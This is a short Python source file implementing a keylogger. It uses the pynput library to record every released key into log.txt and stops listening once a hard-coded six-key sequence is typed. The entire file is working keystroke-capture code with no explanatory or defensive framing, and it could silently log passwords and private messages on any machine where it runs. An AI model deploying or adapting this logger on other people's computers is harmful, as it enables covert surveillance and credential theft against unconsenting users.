from pynput.keyboard import Listener, Key
from collections import deque

password = ["s", "q", "Key.space", "'", "-", "Key.space" ]
keys = deque(maxlen=6)


def log(text):
    with open("log.txt", "a") as file_log:
        file_log.write(text)


def screen(key):
    try:
        log(key.char)
        keys.append(key.char)

    except AttributeError:
        log(" <" + str(key) + "> ")
        keys.append(str(key))

    if "".join(password) == "".join(keys):
        return False


with Listener(on_release = screen) as listener:
    listener.join()